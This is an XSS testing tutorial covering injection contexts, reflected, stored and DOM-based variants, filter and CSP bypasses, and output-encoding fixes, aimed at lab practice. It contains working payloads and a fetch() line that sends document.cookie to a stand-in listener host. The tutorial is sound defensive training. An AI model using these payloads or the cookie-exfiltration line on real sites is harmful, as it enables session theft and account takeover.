## Context decides everything

The same string is harmless in one part of a page and executable in another. XSS
testing is the discipline of locating where your input lands and what that context
does with it.

## Learning objectives

- Identify HTML, attribute, URL, JavaScript and CSS contexts.
- Test reflected, stored and DOM-based variants separately.
- Build a proof of concept that demonstrates impact without harming users.
- Apply output encoding and safe DOM APIs as the fix.

## Prerequisites

- A lab with reflected and stored input.
- Burp Suite and browser DevTools.
- Basic JavaScript.

## Contexts and what escapes them

| Context | Example | Escape strategy |
| --- | --- | --- |
| HTML body | `<p>INPUT</p>` | `<b>` becomes markup |
| Attribute | `<input value="INPUT">` | `"` breaks out |
| URL attribute | `<a href="INPUT">` | `javascript:` scheme |
| Script block | `var x = "INPUT";` | `"` and `</script>` |
| CSS | `style="color: INPUT"` | `expression`, `url()` |
| JSON in HTML | `{"q":"INPUT"}` | `</script>` breakout |

Start by sending a unique marker and finding it in the response:

```bash
curl -s 'https://lab.example/search?q=zqx9182' | grep -n 'zqx9182'
```

Look at the surrounding characters. They tell you what you need to close.

## Reflected XSS

```http
GET /search?q=<script>alert(document.domain)</script>
```

If the response contains the script unencoded, the page executes it. Many filters
block `<script>`; try alternatives that work in the same context:

```html
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
"><img src=x onerror=alert(1)>
```

> [!TIP]
> `alert()` proves execution. `document.domain` proves which origin executed it,
> which is what matters for impact.

## Stored XSS

Feed the payload through a persistence point: profile name, comment, filename,
support ticket, or an admin-reviewed field. Then load the page that renders it.

Stored XSS in an admin panel is often rated higher because it reaches privileged
users. Stored XSS in a public page affects every visitor.

Test both the direct view and any secondary rendering: exports, emails, PDFs and
admin dashboards may render the same data with different encoding.

## DOM-based XSS

The payload never reaches the server. Look for sources and sinks:

| Source | Sink |
| --- | --- |
| `location.hash` | `innerHTML` |
| `location.search` | `document.write` |
| `postMessage` | `eval` |
| `localStorage` | `setAttribute("href", ...)` |

Example:

```js
// Vulnerable
const name = new URLSearchParams(location.search).get("name");
document.getElementById("greeting").innerHTML = `Hello ${name}`;
```

`?name=<img src=x onerror=alert(1)>` executes without a server round trip. Burp's
DOM Invader automates source-to-sink tracing in Chromium.

## Proving impact

A report needs more than an alert box. Show one of:

- Session-relevant action performed as the victim (change email, create API key).
- Data exfiltration to a listener you control, using your own account.
- Bypass of a CSRF token by reading it from the DOM.

Use a harmless marker:

```html
<script>
fetch("https://your-listener.example/collect?c=" + document.cookie);
</script>
```

With `HttpOnly` cookies this returns nothing — which is itself useful evidence
about impact. Prefer demonstrating an action over cookie theft.

## Filters and bypasses

| Filter | Approach |
| --- | --- |
| `<script>` blocked | Event handlers on allowed tags |
| `on*` stripped | Alternative tags, SVG, `<details open ontoggle>` |
| Parentheses blocked | Template literals, `alert\`1\`` |
| Encoding applied once | Double encoding may decode twice |
| CSP blocks inline | Look for a JSONP endpoint or an allowed CDN |

A Content Security Policy that blocks inline script changes exploitability. Test
whether the policy is enforced (check the console) rather than assuming.

## The fix

Encode on output for the destination context:

- HTML body: HTML-entity encode `<`, `>`, `&`, `"`, `'`.
- Attribute: quote attributes and encode quotes.
- JavaScript: serialise with `JSON.stringify`, never string concatenation.
- URL: validate the scheme against an allow-list.

Prefer safe DOM APIs:

```js
// Vulnerable
el.innerHTML = userInput;

// Fixed: text is never parsed as markup
el.textContent = userInput;
```

In React, `{userInput}` is escaped, but `dangerouslySetInnerHTML` is not. Server
side, a templating engine with auto-escaping is safer than string concatenation.

Defence in depth: `HttpOnly` cookies, a restrictive CSP, and input validation for
shape (never as the only control).

## Common mistakes

- Testing only `<script>alert(1)</script>`.
- Reporting self-XSS (payload only the victim can type) as a vulnerability.
- Ignoring the context and claiming a payload "should work".
- Forgetting stored XSS in admin-only views.
- Missing DOM XSS because the server response is clean.

## Toolbox

| Purpose | Tool |
| --- | --- |
| Manual testing | Burp Repeater |
| DOM tracing | DOM Invader, DevTools |
| Payload reference | PortSwigger XSS cheat sheet |
| Lab practice | PortSwigger Academy XSS labs |

## Practice lab

1. Find a reflected parameter and determine its context from the raw response.
2. Escape an attribute context with a quoted payload.
3. Store a payload in a profile field and load the page that renders it.
4. Trace a DOM sink with DevTools and confirm execution client-side.
5. Fix the DOM example with `textContent` and verify the payload renders as text.

## Further reading

- OWASP — XSS Prevention Cheat Sheet.
- PortSwigger Academy — Cross-site scripting labs.
- OWASP WSTG — Testing for XSS (WSTG-INPV-01/02).
